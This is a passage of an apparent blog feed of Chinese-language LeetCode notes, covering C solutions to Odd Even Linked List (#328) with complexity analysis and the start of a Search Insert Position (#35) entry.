href="https://blog.csdn.net/weixin_42292229/article/details/125523668">https://blog.csdn.net/weixin_42292229/article/details/125523668</a><br>[5] <a href="https://ikaminyou.medium.com/leetcode-%E5%88%B71500%E9%A1%8C%E5%BF%83%E8%B7%AF%E6%AD%B7%E7%A8%8B-8614284f03da">https://ikaminyou.medium.com/leetcode-%E5%88%B71500%E9%A1%8C%E5%BF%83%E8%B7%AF%E6%AD%B7%E7%A8%8B-8614284f03da</a></p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> STL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>奇偶數鏈節串列 | Medium | LeetCode#328 Odd Even Linked List</title>
      <link href="/posts/Odd_Even_Linked_List.html"/>
      <url>/posts/Odd_Even_Linked_List.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/328/question1.png"></p><ul><li>題目難度: <code>Medium</code></li><li>題目敘述: 給定一個 single linked list 的 <code>head</code>，將所有具有奇數索引的節點分組在一起，然後將具有偶數索引的節點分組，並傳回重新排序的list。第一個節點為奇數索引，接著第二個為偶數，以此類推，此題要求實作的演算法空間複雜度為 $O(1)$ 而時間複雜度為 $O(n)$</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p><img src="/img/LeetCode/328/algo1.png"></p><blockquote><p>我的想法就是先traverse list，然後紀錄偶數節點個數和奇數節點個數，之後各自建立新的lists，最後合併兩個lists然後回傳薪的head</p></blockquote><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">struct</span> ListNode* <span class="title function_">oddEvenList</span><span class="params">(<span class="keyword">struct</span> ListNode* head)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (head == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> counter = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> oddCounter = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> evenCounter = <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">ptr</span> =</span> head;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// traverse through the list, derive the length of the list</span></span><br><span class="line">    <span class="keyword">while</span>(ptr != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        counter++;</span><br><span class="line">        <span class="keyword">if</span> (counter % <span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">            evenCounter++;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            oddCounter++;</span><br><span class="line">        &#125;</span><br><span class="line">        ptr = ptr-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create odd list</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">oddPtr</span> =</span> head;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">newOddHead</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">OddTail</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">oddPrevious</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; oddCounter; i++) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">newNode</span> =</span> (<span class="keyword">struct</span> ListNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ListNode));</span><br><span class="line">        newNode-&gt;val = oddPtr-&gt;val;</span><br><span class="line">        <span class="keyword">if</span>(i == <span class="number">0</span>)&#123;</span><br><span class="line">            newOddHead = newNode;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            oddPrevious-&gt;next = newNode;</span><br><span class="line">        &#125;</span><br><span class="line">        oddPrevious = newNode;</span><br><span class="line">        <span class="keyword">if</span> (oddPtr-&gt;next != <span class="literal">NULL</span> &amp;&amp; oddPtr-&gt;next-&gt;next != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            oddPtr = oddPtr-&gt;next-&gt;next;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    OddTail = oddPrevious;</span><br><span class="line">    <span class="keyword">if</span> (OddTail != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        OddTail-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create even list</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">evenPtr</span> =</span> head-&gt;next;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">newEvenHead</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">evenPrevious</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; evenCounter; i++) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">newNode</span> =</span> (<span class="keyword">struct</span> ListNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ListNode));</span><br><span class="line">        newNode-&gt;val = evenPtr-&gt;val;</span><br><span class="line">        <span class="keyword">if</span>(i == <span class="number">0</span>)&#123;</span><br><span class="line">            newEvenHead = newNode;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            evenPrevious-&gt;next = newNode;</span><br><span class="line">        &#125;</span><br><span class="line">        evenPrevious = newNode;</span><br><span class="line">        <span class="keyword">if</span> (evenPtr-&gt;next != <span class="literal">NULL</span> &amp;&amp; evenPtr-&gt;next-&gt;next != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            evenPtr = evenPtr-&gt;next-&gt;next;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (evenPrevious != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        evenPrevious-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// merge two lists</span></span><br><span class="line">    <span class="keyword">if</span> (OddTail != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        OddTail-&gt;next = newEvenHead;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        newOddHead = newEvenHead;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> newOddHead;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="說明"><a href="#說明" class="headerlink" title="說明"></a>說明</h3><ul><li>首先，函數檢查輸入的list是否為空，如果是empty list，則直接返回 NULL。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> counter = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> oddCounter = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> evenCounter = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">ptr</span> =</span> head;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(ptr != <span class="literal">NULL</span>)&#123;</span><br><span class="line">    counter++;</span><br><span class="line">    <span class="keyword">if</span> (counter % <span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">        evenCounter++;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        oddCounter++;</span><br><span class="line">    &#125;</span><br><span class="line">    ptr = ptr-&gt;next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>這個部分主要是用來計算奇數和偶數節點各自的數量</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">oddPtr</span> =</span> head;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">newOddHead</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">OddTail</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">oddPrevious</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; oddCounter; i++) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">newNode</span> =</span> (<span class="keyword">struct</span> ListNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ListNode));</span><br><span class="line">    newNode-&gt;val = oddPtr-&gt;val;</span><br><span class="line">    <span class="keyword">if</span>(i == <span class="number">0</span>)&#123;</span><br><span class="line">        newOddHead = newNode;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        oddPrevious-&gt;next = newNode;</span><br><span class="line">    &#125;</span><br><span class="line">    oddPrevious = newNode;</span><br><span class="line">    <span class="keyword">if</span> (oddPtr-&gt;next != <span class="literal">NULL</span> &amp;&amp; oddPtr-&gt;next-&gt;next != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        oddPtr = oddPtr-&gt;next-&gt;next;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">OddTail = oddPrevious;</span><br><span class="line"><span class="keyword">if</span> (OddTail != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    OddTail-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>上面這段則是要建立奇數 linked list</li><li>首先宣告的奇數的指標 <code>oddPtr</code>，用於走訪原本的List，<code>newOddHead</code>、<code>OddTail</code> 新的 Head 與 Tail，用於存放前一個節點的指標 <code>oddPrevious</code></li><li>接著就是在 for 迴圈中創建奇數節點，特別需要針對在 <code>i==0</code> 的時候指定新的 Head，其餘就將 <code>oddPrevious-&gt;next = newNode;</code> 在if-else判斷式之外，會將 <code>oddPrevious</code> 更新為當前節點，**接著就是讓 <code>oddPtr</code> 走訪到原始List的下下個節點(奇數)**，這裡需要小心的是，<code>oddPtr-&gt;next</code> 或者 <code>oddPtr-&gt;next-&gt;next</code> 可能會訪問到NULL，形成空指標，這會導致 RuntimeError，因此需要做判斷。</li><li>list建立完後，指定最後一個節點為 Tail 節點，並將其指向 NULL</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">evenPtr</span> =</span> head-&gt;next;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">newEvenHead</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">evenPrevious</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; evenCounter; i++) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">newNode</span> =</span> (<span class="keyword">struct</span> ListNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ListNode));</span><br><span class="line">    newNode-&gt;val = evenPtr-&gt;val;</span><br><span class="line">    <span class="keyword">if</span>(i == <span class="number">0</span>)&#123;</span><br><span class="line">        newEvenHead = newNode;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        evenPrevious-&gt;next = newNode;</span><br><span class="line">    &#125;</span><br><span class="line">    evenPrevious = newNode;</span><br><span class="line">    <span class="keyword">if</span> (evenPtr-&gt;next != <span class="literal">NULL</span> &amp;&amp; evenPtr-&gt;next-&gt;next != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        evenPtr = evenPtr-&gt;next-&gt;next;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (evenPrevious != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    evenPrevious-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>偶數List做的事情一樣，差別是不用指定 Tail 節點</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> (OddTail != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        OddTail-&gt;next = newEvenHead;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        newOddHead = newEvenHead;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> newOddHead;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>最後就是合併Lists，將奇數list的Tail 接到偶數list的Head，之後回傳新的 head</li></ul><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/328/results1.png"></p><blockquote><p>這種作法感覺有點太過冗長，並且需要額外考慮很多空指標的狀況…</p></blockquote><h2 id="更好的做法"><a href="#更好的做法" class="headerlink" title="更好的做法"></a>更好的做法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">struct</span> ListNode* <span class="title function_">oddEvenList</span><span class="params">(<span class="keyword">struct</span> ListNode* head)</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (head == <span class="literal">NULL</span> || head-&gt;next == <span class="literal">NULL</span>) <span class="keyword">return</span> head;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">oddPtr</span> =</span> head;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">evenPtr</span> =</span> head-&gt;next;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">evenHead</span> =</span> evenPtr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (evenPtr != <span class="literal">NULL</span> &amp;&amp; evenPtr-&gt;next != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        oddPtr-&gt;next = evenPtr-&gt;next;</span><br><span class="line">        oddPtr = oddPtr-&gt;next;</span><br><span class="line">        evenPtr-&gt;next = oddPtr-&gt;next;</span><br><span class="line">        evenPtr = evenPtr-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    oddPtr-&gt;next = evenHead;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure><blockquote><p>超級優美的寫法</p></blockquote><ul><li>一樣是先判斷是否有空鏈結，如果有就回傳null</li><li>這段代碼初始化了三個指標：<ul><li><code>oddPtr</code> 指向奇數位置的節點（初始指向 <code>head</code>）</li><li><code>evenPtr</code> 指向偶數位置的節點（初始指向 <code>head-&gt;next</code>）</li><li><code>evenHead</code> 用來保存偶數鏈表的頭指針，以便後續合併list</li></ul></li></ul><p>接著就是神奇的地方了</p><ul><li>只要把奇數節點的下一個鏈結到偶數節點的下一個，則可以建立奇數鏈結</li><li>只要把偶數節點的下一個鏈結到奇數節點的下一個，則可以建立偶數鏈結</li><li>最後將奇數的指標接到偶數的Head 即完成</li></ul><h3 id="執行結果-1"><a href="#執行結果-1" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/328/results2.png"></p><h2 id="複雜度分析-我的解法"><a href="#複雜度分析-我的解法" class="headerlink" title="複雜度分析- 我的解法"></a>複雜度分析- 我的解法</h2><h3 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h3><ul><li>計算節點數量:程式碼首先遍歷整個linked list以計算鏈表的長度 n。這個操作的時間複雜度是 $O(n)$，其中 n 是 list 的節點數量</li><li>創建奇數索引linked list: 根據奇數索引的節點數量 <code>oddCounter</code> 遍歷原始list，創建一個新的奇數索引list。<strong>由於 <code>oddCounter</code> 最大為 <code>n/2</code>，因此創建過程的時間複雜度為 $O(n)$</strong></li><li>創建偶數索引linked list: 根據奇數索引的節點數量 <code>evenCounter</code> 遍歷原始list，創建一個新的奇數索引list。<strong>由於 <code>evenCounter</code> 最大為 <code>n/2</code>，因此創建過程的時間複雜度為 $O(n)$</strong></li><li>最後，合併兩個鏈表的操作是常數時間的 $O(1)$</li></ul><h3 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h3><p>除了存儲原始list之外，程式碼使用了額外的空間來存儲新創建的奇數索引和偶數索引list的節點。<br><code>oddCounter</code> 和 <code>evenCounter</code> 分別代表奇數索引和偶數索引的節點數量。最壞情況下，它們各自最多為 <code>n/2</code>，因此額外空間複雜度為 $O(n)$</p><blockquote><p>因此這不滿足題目要求</p></blockquote><h2 id="複雜度分析-另一個解法"><a href="#複雜度分析-另一個解法" class="headerlink" title="複雜度分析- 另一個解法"></a>複雜度分析- 另一個解法</h2><h3 id="時間複雜度-1"><a href="#時間複雜度-1" class="headerlink" title="時間複雜度"></a>時間複雜度</h3><p>只做了單次traverse，程式碼只需一次遍歷整個List，並在遍歷過程中執行節點的重新排列操作。<br>因此，時間複雜度為 $O(n)$，其中 n 是節點數量</p><h3 id="空間複雜度-1"><a href="#空間複雜度-1" class="headerlink" title="空間複雜度"></a>空間複雜度</h3><p>程式碼僅使用了幾個額外的指標變數來記錄奇數節點 <code>oddPtr</code>、偶數節點 <code>evenPtr</code> 以及偶數節點鏈表的頭部 <code>evenHead</code><br>因此，額外空間的使用是常數級別的 $O(1)$</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Medium </tag>
            
            <tag> Linked List </tag>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>尋找插入位置 | Easy | LeetCode#35 Search Insert Position</title>
      <link href="/posts/search_insert_position.html"/>
      <url>/posts/search_insert_position.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/35/question.png"></p><ul><li>題目難度: <code>Easy</code></li><li>題目敘述: 給定已排序的整數陣列，以及一個目標值，若再陣列中找到目標值就返回 index，如果沒有就返回適合插入的位址。另外題目也要求實作演算法的複雜度要是 $O(log n)$。</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><ul><li>針對已排序的陣列，尋找目標值的方法使用 <strong>Binary Search</strong> 可以滿足需求</li></ul><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">searchInsert</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">    <span class="type">int</span> right, left, mid;</span><br><span class="line">    right = numsSize<span class="number">-1</span>;  </span><br><span class="line">    left = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(left &lt; right)&#123;</span><br><span class="line">        mid = left + (right - left)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (target &lt; nums[mid])&#123;     </span><br><span class="line">            right = mid; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (target &gt; nums[mid])&#123;</span><br><span class="line">            left = mid+<span class="number">1</span>;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (left == right)&#123;  </span><br><span class="line">        <span class="keyword">if</span> (target &lt; nums[left])&#123;              </span><br><span class="line">            mid= left;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (target &gt; nums[left])&#123;  </span><br><span class="line">            mid = left+<span class="number">1</span>;    </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            mid = left;</span><br><span class="line">            <span class="keyword">return</span> mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> mid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="說明"><a href="#說明" class="headerlink" title="說明"></a>說明</h3><ul><li>這裡就是經典的 Binary Search 寫法，設定左右界，計算中間值，當 <code>left &lt; right</code> 的時候就改變搜尋範圍</li><li>如果目標值 &lt; 中間值，就尋找中間值左側的區塊，因此將 <code>right=mid</code></li><li>如果目標值 &gt; 中間值，就尋找中間值右側的區塊，因此將 <code>left=mid+1</code></li><li>如果過程中如果目標值 &#x3D; 中間值，就返回中間值</li><li>這裡與平常使用 Binary Search 不同的是，這裡將 <code>left = right</code> 單獨出來處理，因為題目要求如果沒有找到 target 值，需要返回適合插入的 index。</li><li>當沒找到 target 值時，若 target值 &lt; 目前的 <code>left</code> 或 <code>right</code>，則適合插入值會是 <code>left</code> 或 <code>right</code></li><li>當沒找到 target 值時，若 target值 &gt; 目前的 <code>left</code> 或 <code>right</code>，則適合插入值會是 <code>left+1</code> 或 <code>right+1</code></li><li>當沒找到 target 值時，若 target值 &#x3D; 目前的 <code>left</code> 或 <code>right</code>，則適合插入值會是 <code>left</code> 或 <code>right</code></li><li>接著就回傳index 值</li></ul><h3 id="完整測試程式碼"><a href="#完整測試程式碼" class="headerlink" title="完整測試程式碼"></a>完整測試程式碼</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 